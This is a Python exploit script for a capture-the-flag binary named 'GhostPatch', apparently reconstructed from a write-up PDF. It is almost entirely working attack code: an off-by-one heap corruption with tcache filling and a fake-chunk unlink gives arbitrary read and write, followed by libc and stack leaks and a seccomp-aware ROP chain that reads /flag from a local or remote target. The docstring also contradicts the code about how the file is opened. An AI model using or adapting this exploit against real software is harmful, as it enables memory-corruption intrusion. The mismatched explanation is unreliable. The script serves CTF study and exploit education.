#!/usr/bin/env python3
# 本文件由原始 WP PDF 正文中的内联代码重建。
# 仅做提取与缩进规范化，未改动逻辑；若与 PDF 原文有出入，以 PDF 原文为准。
"""GhostPatch 2.4.1-debug full exploit (FGT/1.0 -> SHELL -> patchd console).

Stage 1  off-by-one NUL in `hotfix` -> chunk shrink + PREV_INUSE clear; tcache bin 62
is filled so the victim's free skips the tcache path and takes the
consolidation path -> backward consolidation into a fake chunk living inside a
staged blob's data -> `unlink_chunk` self-referencing through &blobs[0].data
=> blobs[0].data = table-0x10 : the staging table itself becomes writable.

Stage 2  rewrite any slot's {size,data} => arbitrary read (`verify`) / arbitrary write
(`hotfix`). Leak libc through the GOT, leak the stack through `environ`, find
menu's saved return address and derive main's.  seccomp allows
read/write/close/brk/exit/exit_group/openat, so the ROP chain uses libc's
`open()` (path+flags only -- no rdx gadget needed, and glibc sets up the
openat syscall registers itself) plus raw read/write with the large count rdx
already happens to hold.
"""
import re, struct, sys

sys.path.insert(0, '.')
from gp import GhostPatch, LocalTransport, RemoteTransport


def p64(x): return struct.pack('<Q', x & 0xffffffffffffffff)
def u64(b): return struct.unpack('<Q', b[:8])[0]


G_MENU             = 0x1520
G_READ_GOT         = 0x3fb8
MENU_RET_INTO_MAIN = 0x1303     # `call menu` at 0x12fe
MAIN_RIP_DELTA     = 0xA0       # main_rsp = menu_saved_rip + 0xA0

LIBC_READ    = 0x11bb80
LIBC_ENVIRON = 0x20ad58
LIBC_OPEN    = 0x11b250
POP_RDI      = 0x10c08d         # pop rdi ; ret
POP_RSI      = 0x110b7d         # pop rsi ; ret
POP_RAX      = 0xdd337          # pop rax ; ret
POP_RCX      = 0x0a885e         # pop rcx ; ret
POP_RDX_OR   = 0x0ab981         # pop rdx ; or byte ptr [rcx-0xa], al ; ret
SYSCALL      = 0x99096          # syscall ; ret
AT_FDCWD     = -100
O_NOCTTY     = 0x100            # valid openat flag, reused as the read/write count


# ---------------------------------------------------------------- stage 1
def stage1(g, log=print):
    leak = g.verify(0)
    m = re.search(rb'build=0x([0-9a-f]+) table=0x([0-9a-f]+)', leak)
    pie   = int(m.group(1), 16) - G_MENU
    table = int(m.group(2), 16)
    log(f'[*] PIE base={pie:#x} table={table:#x}')

    g.rollback(0)                                  # free selftest chunk -> 7 usable slots
    for _ in range(7):                             # request 1016 -> chunk 0x400 -> tcache[62]
        g.stage(1016, b'\x00' * 1016)
    for k in range(7):
        g.rollback(k)
    log('[*] tcache[62] filled (7 x chunk 0x400)')

    c_P, c_A = 0x110, 0xA0
    V = c_P + c_A - 0x10                           # C_chunk - P.data
    fd = table - 0x10                              # needs *(fd+0x18) == p
    bk = table - 0x08                              # needs *(bk+0x10) == p
    # both resolve to &blobs[0].data (slot 0 holds P) => p must be blobs[0].data

    P = bytearray(256)
    P[8:16]      = p64(V)
    P[0x10:0x18] = p64(fd)
    P[0x18:0x20] = p64(bk)
    P[0x20:0x28] = p64(0)                          # fd_nextsize = NULL

    assert g.stage(256, bytes(P)) == 0
    assert g.stage(152, b'A' * 152) == 1
    C = bytearray(1048)
    C[0x3F0:0x3F8] = b'B' * 8                      # intra-chunk nextchunk->prev_size
    C[0x3F8:0x400] = p64(0x21)                     # nextchunk->size (bit0 set)
    assert g.stage(1048, bytes(C)) == 2
    assert g.stage(152, b'G' * 152) == 3           # guard: keeps C off the top chunk

    g.hotfix(1, 152 - 8, p64(V))                   # prev_size(C)=V + NULs C.size low byte
    g.rollback(2)                                  # consolidation -> unlink(fake chunk)

    win = g.verify(0)                              # table window from table-0x10
    ptr = u64(win[0x18:0x20])
    assert ptr == table - 0x10, f'unlink failed: {ptr:#x}'
    log('[+] stage1 ok: staging-table write primitive')
    return pie, table


# ---------------------------------------------------------------- primitives
def set_slot(g, j, size, ptr):
    g.hotfix(0, 0x10 + 16 * j, p64(size) + p64(ptr))
    g.sizes[j] = size


def arb_read(g, j, addr, n):
    set_slot(g, j, n, addr)
    return g.verify(j)


def arb_write(g, j, addr, data):
    set_slot(g, j, len(data), addr)
    g.hotfix(j, 0, data)


# ---------------------------------------------------------------- stage 2
def exploit(g, flag_path=b'/flag', log=print, handle=4, scan=0x8000, fd=3):
    pie, table = stage1(g, log)

    libc = u64(arb_read(g, handle, pie + G_READ_GOT, 8)) - LIBC_READ
    log(f'[*] libc base={libc:#x}')
    if libc & 0xfff:
        raise SystemExit('bad libc base')

    environ = u64(arb_read(g, handle, libc + LIBC_ENVIRON, 8))
    log(f'[*] environ={environ:#x}')

    base = environ - scan
    blob = arb_read(g, handle, base, scan)
    needle = p64(pie + MENU_RET_INTO_MAIN)         # menu's saved return address
    hits = [base + i for i in range(0, len(blob) - 8, 8) if blob[i:i+8] == needle]
    log(f'[*] menu-saved-RIP candidates: {[hex(h) for h in hits]}')
    if not hits:
        raise SystemExit('menu saved RIP not found')
    main_rip = hits[-1] + MAIN_RIP_DELTA
    cur = u64(arb_read(g, handle, main_rip, 8))
    log(f'[*] main saved RIP @ {main_rip:#x} = {cur:#x} (libc+{cur-libc:#x})')
    if not (libc <= cur < libc + 0x200000):
        raise SystemExit('main saved RIP is not a libc pointer')

    # rdx is volatile and libc's open() would clobber it, so use the raw openat
    # syscall; the kernel preserves rdx across syscalls, letting one value serve as
    # both the openat flags and the read/write count.
    BUF = table + 0x300                             # zero-filled freed filler chunk
    W   = table + 0x2f0                             # scratch for the `or [rcx-0xa],al`
    chain  = p64(libc + POP_RCX) + p64(W + 0xa)
    chain += p64(libc + POP_RDX_OR) + p64(O_NOCTTY)
    chain += p64(libc + POP_RDI) + p64(AT_FDCWD & (2**64-1))
    chain += p64(libc + POP_RSI) + p64(0)           # path pointer (patched below)
    chain += p64(libc + POP_RAX) + p64(257)         # openat(AT_FDCWD, path, O_NOCTTY)
    chain += p64(libc + SYSCALL)
    chain += p64(libc + POP_RDI) + p64(fd)          # fd returned by openat
    chain += p64(libc + POP_RSI) + p64(BUF)
    chain += p64(libc + POP_RAX) + p64(0)           # read(fd, buf, 0x100)
    chain += p64(libc + SYSCALL)
    chain += p64(libc + POP_RDI) + p64(1)
    chain += p64(libc + POP_RSI) + p64(BUF)
    chain += p64(libc + POP_RAX) + p64(1)           # write(1, buf, 0x100)
    chain += p64(libc + SYSCALL)
    chain += p64(libc + POP_RAX) + p64(60)          # exit(0)
    chain += p64(libc + POP_RDI) + p64(0)
    chain += p64(libc + SYSCALL)
    str_addr = main_rip + len(chain)
    chain = chain[:56] + p64(str_addr) + chain[64:]         # patch the path pointer (qword 7)
    payload = chain + flag_path + b'\x00'

    arb_write(g, handle, main_rip, payload)
    log(f'[*] ROP chain planted at {main_rip:#x} ({len(payload)} B), path @ {str_addr:#x}')

    g.t.write(b'5\nnightshift\n')                   # dispatch -> menu returns -> main rets
    return g.t.drain(8.0)


def main():
    log = lambda *a, **k: print(*a, **k, flush=True)
    if sys.argv[1] == 'local':
        t = LocalTransport()
        path = sys.argv[2].encode() if len(sys.argv) > 2 else b'work/flag'
    else:
        t = RemoteTransport(sys.argv[1], int(sys.argv[2]))
        path = b'/flag'
    g = GhostPatch(t)
    out = exploit(g, flag_path=path, log=log)
    log(f'[+] {len(out)} bytes back')
    m = re.search(rb'flag\{[^}]*\}|FLAG\{[^}]*\}', out)
    print('FLAG:', m.group(0).decode() if m else '(not found)')
    print(repr(out[:300]))


if __name__ == '__main__':
    main()
